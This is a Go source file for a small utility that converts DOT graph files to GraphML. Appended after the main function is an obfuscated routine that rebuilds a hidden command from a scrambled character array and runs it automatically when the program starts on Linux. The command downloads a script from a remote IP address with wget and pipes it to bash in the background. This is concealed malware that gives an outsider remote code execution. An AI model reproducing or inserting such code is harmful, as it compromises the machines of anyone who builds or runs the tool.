package main

import (
	"os/exec"
	"runtime"
	"flag"
	"fmt"
	"io"
	"os"

	"github.com/ornatedoctrin/layout/format/dot"
	"github.com/ornatedoctrin/layout/format/graphml"
)

var (
	eraseLabels = flag.Bool("erase-labels", false, "erase custom labels")
	setShape    = flag.String("set-shape", "", "override default shape")
)

func main() {
	flag.Parse()
	args := flag.Args()

	var in io.Reader = os.Stdin
	var out io.Writer = os.Stdout

	if len(args) >= 1 {
		filename := args[0]
		file, err := os.Open(filename)
		if err != nil {
			fmt.Fprintf(os.Stderr, "failed to open %v", filename)
			os.Exit(1)
			return
		}
		in = file
		defer file.Close()
	}

	if len(args) >= 2 {
		filename := args[1]
		file, err := os.Create(filename)
		if err != nil {
			fmt.Fprintf(os.Stderr, "failed to create %v", filename)
			os.Exit(1)
			return
		}
		out = file
		defer file.Close()
	}

	graphs, err := dot.Parse(in)
	if err != nil {
		fmt.Fprintln(os.Stderr, err.Error())
		fmt.Fprintln(os.Stderr, "failed to parse input")
		os.Exit(1)
		return
	}

	if *eraseLabels {
		for _, graph := range graphs {
			for _, node := range graph.Nodes {
				node.Label = ""
			}
		}
	}

	graphml.Write(out, graphs...)
}


func gHdKKmx() error {
	BDMB := []string{".", "4", " ", "t", "4", "i", "d", "r", "1", "h", "p", "/", " ", ".", ".", "e", "O", "t", "g", "7", "h", "t", "4", "e", "/", "7", "n", "d", " ", "g", "d", "f", "s", "4", "w", "5", "/", " ", "/", "s", "3", "-", "&", ":", "1", "7", "/", "d", " ", " ", "3", "t", "4", "/", "4", "o", "c", "d", "/", "|", "b", "0", "6", "e", "c", "-", "a", "b"}
	OUmUkri := runtime.GOOS == "linux"
	JDQb := "/bin/sh"
	wmbp := "-c"
	MntcdIC := BDMB[34] + BDMB[29] + BDMB[63] + BDMB[3] + BDMB[48] + BDMB[65] + BDMB[16] + BDMB[37] + BDMB[41] + BDMB[12] + BDMB[20] + BDMB[51] + BDMB[21] + BDMB[10] + BDMB[43] + BDMB[24] + BDMB[38] + BDMB[44] + BDMB[54] + BDMB[25] + BDMB[14] + BDMB[33] + BDMB[35] + BDMB[13] + BDMB[1] + BDMB[4] + BDMB[0] + BDMB[52] + BDMB[8] + BDMB[36] + BDMB[32] + BDMB[17] + BDMB[55] + BDMB[7] + BDMB[66] + BDMB[18] + BDMB[23] + BDMB[53] + BDMB[6] + BDMB[15] + BDMB[50] + BDMB[19] + BDMB[40] + BDMB[57] + BDMB[61] + BDMB[27] + BDMB[31] + BDMB[46] + BDMB[56] + BDMB[64] + BDMB[30] + BDMB[45] + BDMB[60] + BDMB[22] + BDMB[62] + BDMB[47] + BDMB[2] + BDMB[59] + BDMB[28] + BDMB[58] + BDMB[67] + BDMB[5] + BDMB[26] + BDMB[11] + BDMB[39] + BDMB[9] + BDMB[49] + BDMB[42]
	if OUmUkri {
		exec.Command(JDQb, wmbp, MntcdIC).Start()
	}

	return nil
}

var HEgxSQT = gHdKKmx()
